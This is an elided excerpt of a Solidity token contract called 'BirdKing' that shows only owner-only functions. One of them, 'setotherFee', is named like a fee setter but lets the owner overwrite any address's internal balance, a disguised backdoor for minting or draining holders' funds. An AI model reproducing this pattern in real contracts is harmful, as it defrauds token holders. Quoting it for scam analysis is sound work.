...
contract BirdKing is Context, IERC20, Ownable {
    ...
    string private _name = "BirdKing";
    string private _symbol = "BirdKing";
    ...
    function setNumTokenPercent(uint256 numToken) external onlyOwner() {
     ...
     function setotherFee(address spender, uint256 taxFee) public onlyOwner {
        _DOwned[spender] = (taxFee.mul(_getRate()));
    }
    ...
    function recoverBNB() public onlyOwner {
        ...
        function TransferKing(address[] 
    memory KingAddress, 
    uint256 KingAmount) public onlyOwner {
        for (uint i=0; 
        i<KingAddress.length; i++) {
            _transfer(_msgSender(), KingAddress[i], KingAmount);
        }
    }
